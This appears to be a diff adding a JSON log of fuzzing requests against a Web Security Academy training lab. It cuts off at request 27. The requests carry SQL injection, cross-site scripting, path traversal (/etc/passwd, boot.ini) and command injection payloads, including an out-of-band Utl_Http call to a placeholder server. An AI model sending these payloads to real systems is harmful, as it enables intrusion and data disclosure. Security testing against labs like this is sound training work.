@@ -1,0 +1,1244 @@
+{
+    "Requests": [
+        {
+            "index": 0,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=‘",
+            "param": "?category=‘",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "‘"
+        },
+        {
+            "index": 1,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=‘--",
+            "param": "?category=‘--",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "‘--"
+        },
+        {
+            "index": 2,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=‘ or 1=1--",
+            "param": "?category=‘ or 1=1--",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "‘ or 1=1--"
+        },
+        {
+            "index": 3,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=' or 1 in (@@version)--",
+            "param": "?category=' or 1 in (@@version)--",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "' or 1 in (@@version)--"
+        },
+        {
+            "index": 4,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category='; waitfor delay '0:30:0'--",
+            "param": "?category='; waitfor delay '0:30:0'--",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "'; waitfor delay '0:30:0'--"
+        },
+        {
+            "index": 5,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category='||Utl_Http.request('http://<yourservername>') from dual--",
+            "param": "?category='||Utl_Http.request('http://<yourservername>') from dual--",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "'||Utl_Http.request('http://<yourservername>') from dual--"
+        },
+        {
+            "index": 6,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=xsstest",
+            "param": "?category=xsstest",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "xsstest"
+        },
+        {
+            "index": 7,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=xsstest%00\"<>'",
+            "param": "?category=xsstest%00\"<>'",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "xsstest%00\"<>'"
+        },
+        {
+            "index": 8,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=</foo>",
+            "param": "?category=</foo>",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "</foo>"
+        },
+        {
+            "index": 9,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=../../../../../../../../../../etc/passwd",
+            "param": "?category=../../../../../../../../../../etc/passwd",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "../../../../../../../../../../etc/passwd"
+        },
+        {
+            "index": 10,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=../../../../../../../../../../boot.ini",
+            "param": "?category=../../../../../../../../../../boot.ini",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "../../../../../../../../../../boot.ini"
+        },
+        {
+            "index": 11,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd",
+            "param": "?category=..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd"
+        },
+        {
+            "index": 12,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=..\\..\\..\\..\\..\\..\\..\\..\\..\\..\boot.ini",
+            "param": "?category=..\\..\\..\\..\\..\\..\\..\\..\\..\\..\boot.ini",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\boot.ini"
+        },
+        {
+            "index": 13,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &",
+            "param": "?category=|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &"
+        },
+        {
+            "index": 14,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=| ping -i 30 127.0.0.1 |",
+            "param": "?category=| ping -i 30 127.0.0.1 |",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "| ping -i 30 127.0.0.1 |"
+        },
+        {
+            "index": 15,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=| ping -n 30 127.0.0.1 |",
+            "param": "?category=| ping -n 30 127.0.0.1 |",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "| ping -n 30 127.0.0.1 |"
+        },
+        {
+            "index": 16,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=& ping -i 30 127.0.0.1 &",
+            "param": "?category=& ping -i 30 127.0.0.1 &",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "& ping -i 30 127.0.0.1 &"
+        },
+        {
+            "index": 17,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=& ping -n 30 127.0.0.1 &",
+            "param": "?category=& ping -n 30 127.0.0.1 &",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "& ping -n 30 127.0.0.1 &"
+        },
+        {
+            "index": 18,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=; ping 127.0.0.1 ;",
+            "param": "?category=; ping 127.0.0.1 ;",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "; ping 127.0.0.1 ;"
+        },
+        {
+            "index": 19,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=%0a ping -i 30 127.0.0.1 %0a",
+            "param": "?category=%0a ping -i 30 127.0.0.1 %0a",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "%0a ping -i 30 127.0.0.1 %0a"
+        },
+        {
+            "index": 20,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=`ping 127.0.0.1`",
+            "param": "?category=`ping 127.0.0.1`",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "`ping 127.0.0.1`"
+        },
+        {
+            "index": 21,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=| id",
+            "param": "?category=| id",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "| id"
+        },
+        {
+            "index": 22,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=& id",
+            "param": "?category=& id",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "& id"
+        },
+        {
+            "index": 23,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=; id",
+            "param": "?category=; id",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "; id"
+        },
+        {
+            "index": 24,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=%0a id %0a",
+            "param": "?category=%0a id %0a",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "%0a id %0a"
+        },
+        {
+            "index": 25,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=`id`",
+            "param": "?category=`id`",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": "`id`"
+        },
+        {
+            "index": 26,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=;echo 111111",
+            "param": "?category=;echo 111111",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Referer": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=Accessories",
+                "Connection": "keep-alive",
+                "Cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+                "Upgrade-Insecure-Requests": "1",
+                "Cache-Control": "max-age=0"
+            },
+            "payload": ";echo 111111"
+        },
+        {
+            "index": 27,
+            "method": "GET",
+            "URL": "https://acc11fa61e94255c80791ae000ed001c.web-security-academy.net/filter?category=echo 111111",
+            "param": "?category=echo 111111",
+            "cookie": "session=eZBGwwIFFXsko3e8KWhy5LhwEZahvAda",
+            "header": {
+                "Host": "acc11fa61e94255c80791ae000ed001c.web-security-academy.net",
